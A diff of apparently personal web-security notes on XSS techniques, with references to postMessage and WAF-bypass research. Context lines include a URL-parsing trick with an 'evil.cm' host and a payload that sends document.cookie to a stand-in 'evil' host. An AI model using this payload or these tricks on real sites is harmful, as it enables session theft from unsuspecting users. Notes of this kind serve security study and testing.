@@ -119,6 +119,9 @@ feed://evil.cm%2f/x.rss%3f@vulnsite.com/
 * httponly bypass
 asp.net: the csrf protection is to actually include the session ID is in the ViewState (owasp)
 
+* delay page load
+<link rel="stylesheet" href="http://..">
+
 # attack payloads
 window.location='https://evil/?c='.concat(document.cookie);
 
@@ -211,3 +214,7 @@ https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfilt
 # postMessage
 https://github.com/EdOverflow/bugbountywiki/wiki/postMessage-issues
 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/
+
+# WAF blocks <[a-zA-Z]
+https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs covers this in "Basic HTML context but WAF blocks <[a-zA-Z]"
+allows non-html content injection though (i.e attacker can write new sentences), not the greatest bug
